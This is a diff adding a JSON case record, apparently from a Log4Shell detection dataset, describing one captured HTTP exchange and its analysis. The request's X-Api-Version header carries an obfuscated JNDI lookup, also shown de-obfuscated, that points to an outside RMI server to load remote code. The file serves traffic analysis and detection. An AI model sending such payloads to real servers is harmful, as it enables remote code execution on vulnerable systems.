@@ -1,0 +1,43 @@
+{
+  "case_id": "log4shell_rmi_x_api_version_ev5_001",
+  "source_raw": "raw/02_sample_packet_rmi-x-api-version-ev5.json",
+  "streams": [
+    {
+      "stream_key": "172.17.0.1:56872-172.17.0.4:8888-tcp",
+      "protocol": "HTTP",
+      "encrypted": false,
+      "segments": [
+        {
+          "no": 4,
+          "time": 0.000411,
+          "timestamp_utc": "Dec 21, 2021 17:47:35.129287000 UTC",
+          "position": "http_header.x_api_version",
+          "payload": "GET /app/servlet HTTP/1.1\r\nHost: 172.17.0.4:8888\r\nUser-Agent: python-requests/2.25.1\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nX-Api-Version: ${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}://34.91.73.37:1099/gp9pc7}\r\n\r\n"
+        }
+      ]
+    },
+    {
+      "stream_key": "172.17.0.4:8888-172.17.0.1:56872-tcp",
+      "protocol": "HTTP",
+      "encrypted": false,
+      "segments": [
+        {
+          "no": 24,
+          "time": 0.024774,
+          "timestamp_utc": "Dec 21, 2021 17:47:35.153650000 UTC",
+          "position": "http_response",
+          "payload": "HTTP/1.1 200 \r\nContent-Type: text/plain;charset=utf-8\r\nContent-Length: 30\r\nDate: Tue, 21 Dec 2021 17:47:35 GMT\r\nKeep-Alive: timeout=60\r\nConnection: keep-alive\r\n\r\nThis is the standard response\n"
+        }
+      ]
+    }
+  ],
+  "candidate_notes": [
+    {
+      "position": "http_header.x_api_version",
+      "candidate_type": "log4shell_obfuscation",
+      "raw": "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}://34.91.73.37:1099/gp9pc7}",
+      "normalized_payload": "${jndi:rmi://34.91.73.37:1099/gp9pc7}"
+    }
+  ],
+  "limitations": "This raw JSON contains the HTTP exploit request/response only. Full RMI callback payload is not present in this segmentation source."
+}
